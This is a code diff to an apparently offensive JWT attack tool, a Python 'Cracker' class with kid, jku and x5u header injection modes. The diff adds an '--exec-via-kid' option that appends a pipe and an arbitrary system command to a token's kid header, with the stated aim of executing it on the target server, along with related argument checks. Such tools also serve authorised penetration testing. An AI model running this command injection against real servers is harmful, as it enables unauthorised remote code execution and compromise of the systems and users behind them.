@@ -139,7 +139,7 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, kid_curl_info, specified_key,
+    def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, kid_curl_info, exec_via_kid, specified_key,
                  jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False, manual=False):
         """
         :param token: The user input token -> str.
@@ -178,6 +178,7 @@ class Cracker:
         self.auto_try = auto_try
         self.kid = kid
         self.kid_curl_info = kid_curl_info
+        self.exec_via_kid = exec_via_kid
         self.specified_key = specified_key
         self.jku_basic = jku_basic
         self.jku_redirect = jku_redirect
@@ -270,6 +271,9 @@ class Cracker:
             if any(arg is not None for arg in other_key_related_args) or self.unverified:
                 print(f"{Bcolors.FAIL}ERROR: please don't pass any key related arg with jku attacks{Bcolors.ENDC}")
                 sys.exit(2)
+            if self.exec_via_kid is not None:
+                print(f"{Bcolors.FAIL}ERROR: Executing via kid is incompatible with jku/x5u injections{Bcolors.ENDC}")
+                sys.exit(2)
             if not self.x5u_basic and not self.x5u_header_injection:
                 """Generate a key with OpenSSL"""
                 key = OpenSSL.crypto.PKey()
@@ -294,9 +298,13 @@ class Cracker:
             if self.kid is not None or self.specified_key is not None or self.path_to_key is not None:
                 print(f"{Bcolors.FAIL}ERROR: --auto-try retrieves the key from ssl certs. Do not pass any other key related arg{Bcolors.ENDC}")
                 sys.exit(2)
+            if self.exec_via_kid is not None:
+                print(f"{Bcolors.FAIL}ERROR: Code execution via kid needs no key. --autotry can't be ignored{Bcolors.ENDC}")
             path = Cracker.get_key_from_ssl_cert(self.auto_try)
             self.path_to_key = path
         if self.kid is not None:
+            if self.exec_via_kid is not None:
+                print(f"{Bcolors.FAIL}ERROR: You can't run two different kid injections at once{Bcolors.ENDC}")
             if self.path_to_key is not None or self.specified_key is not None:
                 print(f"{Bcolors.FAIL}ERROR: You don't need to specify a key for kid injections{Bcolors.ENDC}")
                 sys.exit(2)
@@ -319,6 +327,10 @@ class Cracker:
                         f"{Bcolors.FAIL}ERROR: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}"
                     )
                     sys.exit(2)
+        elif self.exec_via_kid is not None:
+            if self.path_to_key is not None or self.specified_key is not None:
+                print(f"{Bcolors.WARNING}WARNING: Code execution via kid requires no key, your one will be ignored{Bcolors.ENDC}")
+            self.key = "itdoesnotmatter"
         elif self.specified_key is not None:
             if self.path_to_key is not None:
                 print(f"{Bcolors.FAIL}ERROR: You have passed two keys with --specify and --key{Bcolors.ENDC}")
@@ -405,6 +417,11 @@ class Cracker:
                 print(f"{Bcolors.FAIL}ERROR: JWT header has no kid{Bcolors.ENDC}")
                 sys.exit(2)
             header_dict['kid'] += self.inject_kid()
+        elif self.exec_via_kid:
+            if "kid" not in header_dict.keys():
+                print(f"{Bcolors.FAIL}ERROR: JWT header has no kid{Bcolors.ENDC}")
+                sys.exit(2)
+            header_dict['kid'] += "|" + self.exec_via_kid
         elif self.jku_basic:
             if "jku" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}ERROR: JWT header has no jku{Bcolors.ENDC}")
@@ -970,6 +987,10 @@ if __name__ == '__main__':
                         help="Specify ip:port (or 'ip:' if port is 80) to send a request to",
                         metavar="<ip>:<port>", required=False
                         )
+    parser.add_argument("--exec-via-kid",
+                        help="Specify a system command to be injected in the kid, to try to execute it on the server",
+                        metavar="<command>", required=False
+                        )
     parser.add_argument("--specify-key",
                         help="Specify a string to use as key", metavar="<key>",
                         required=False
@@ -1003,8 +1024,9 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     cracker = Cracker(
-        args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.kid_curl_info, args.specify_key,
-        args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody, args.unverified, args.decode, args.manual
+        args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.kid_curl_info,
+        args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
+        args.unverified, args.decode, args.manual
     )
     # Start the cracker
     cracker.run()
